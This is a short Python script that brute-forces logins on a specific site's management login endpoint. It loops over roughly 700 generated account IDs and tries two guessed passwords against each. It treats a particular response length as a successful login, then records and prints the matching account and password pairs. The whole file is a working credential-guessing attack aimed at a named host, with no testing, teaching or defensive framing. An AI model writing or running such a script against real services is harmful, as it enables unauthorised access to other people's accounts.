import requests

p = ['asdasd', 'asd123']


A = []
for i in range(100,800):
    for j in p:
        data = {'ID':f'te0{i}', 'PASSWD':j}
        res = requests.post('https://mgr.kgitbank.com/login_check.it', data=data)
        if len(res.text) == 332:
            A.append([i,j])
            print("!"*30)
            break
    
print(A)